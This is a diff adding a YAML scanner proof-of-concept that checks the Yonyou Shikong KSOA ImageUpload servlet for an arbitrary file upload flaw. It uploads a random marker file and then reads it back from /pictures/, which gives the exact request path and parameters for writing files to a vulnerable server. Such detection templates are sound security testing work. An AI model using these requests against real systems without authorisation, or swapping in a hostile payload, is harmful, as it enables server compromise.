@@ -1,0 +1,21 @@
+id: poc-yaml-yysk-KSOA-ImageUpload-file-upload
+info:
+  name: 用友时空KSOA ImageUpload任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友时空KSOA
+variables:
+  t1: random_str(8)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /servlet/com.sksoft.bill.ImageUpload?filename={{.t1}}.txt&filepath=/
+  data: '{{.t2}}
+
+    '
+  expression: status_code == 200 && contains(body,"<root>") && contains(body,t1)
+- method: GET
+  path: /pictures/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,t2)
+transport: http
